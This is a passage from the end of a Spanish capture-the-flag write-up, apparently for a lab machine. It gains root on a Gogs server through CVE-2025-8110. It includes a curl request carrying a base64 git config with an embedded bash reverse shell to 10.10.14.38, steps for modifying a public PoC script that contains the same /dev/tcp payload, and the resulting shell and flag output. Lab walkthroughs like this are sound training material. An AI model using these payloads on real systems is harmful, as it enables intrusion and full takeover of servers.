curl -si -X PUT http://localhost:3001/api/v1/repos/incommatose/evil-repo/contents/link -H 'Content-Type: application/json' -H "Authorization: token $TOKEN" -d '{"message":"exploit","content":"W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQogIHNzaENvbW1hbmQgPSBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM4LzQ0MyAwPiYxJyAjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBnaXRAc2lsZW50aXVtLmh0Yjpnb2dzL2V2aWwtcmVwby5naXQKCWZldGNoID0gK3JlZnMvaGVhZHMvKjpyZWZzL3JlbW90ZXMvb3JpZ2luLyoKW2JyYW5jaCAibWFzdGVyIl0KCXJlbW90ZSA9IG9yaWdpbgoJbWVyZ2UgPSByZWZzL2hlYWRzL21hc3Rlcgo="}'
```

En nuestro listener recibiremos una consola como el usuario `root`

``` bash
Connection from 10.129.21.127:52110
bash: cannot set terminal process group (1514): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# id
id
uid=0(root) gid=0(root) groups=0(root)
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# 
```

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
root@silentium:~# cat root.txt	
cat root.txt 
24e...
```

### PoC

Si no podemos hacerlo manual por algún motivo, podemos usar el PoC de [`zAbuQasem`](https://github.com/zAbuQasem/gogs-CVE-2025-8110) en `Gtihub`

``` bash
git clone https://github.com/zAbuQasem/gogs-CVE-2025-8110 # Sí, se confunde este CVE con gogs-CVE-2025-8110
cd gogs-CVE-2025-8110
python3 -m venv .venv

# load virtual environment
source .venv/bin/activate
pip install .
```

Simplemente debemos crear un usuario dentro de la plataforma y realizar los siguientes cambios al script

``` python
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False
    username = "incommatose"
    password = "test123"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
    try:
        #register(session, args.url, username, password)
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
```

- Configuraremos las credenciales de la cuenta que creamos anteriormente.
- Comentaremos la función `register()`, debido a que aparentemente está rota.

Ahora podremos ejecutar el `PoC` para obtener una reverse shell como `root`

> Si no configuraste `git` con las variables `user.email` y `user.name` te saltará un error, defínelas como se muestra en [[#Config|esta sección]]. Además, te recomiendo omitir la flag `--global`.
{: .notice--danger}

``` bash
python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.14.38 -lp 443
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 1b14f57830ebbc7bf7bba8aa63c94ff5db28456a
Repo creation status: 201
Cloning into '/tmp/c73f82f1b607'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 252 bytes | 252.00 KiB/s, done.
[master dd06140] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 296 bytes | 296.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To http://localhost:3001/incommatose/c73f82f1b607.git
   9972b1c..dd06140  master -> master
[+] Exploit sent, check your listener!
```

Gracias por leer, a continuación te dejo la cita del día.

> To give ones self earnestly to the duties due to men, and, while respecting spiritual beings, to keep aloof from them, may be called wisdom.
> — Confucius
{: .notice--info}
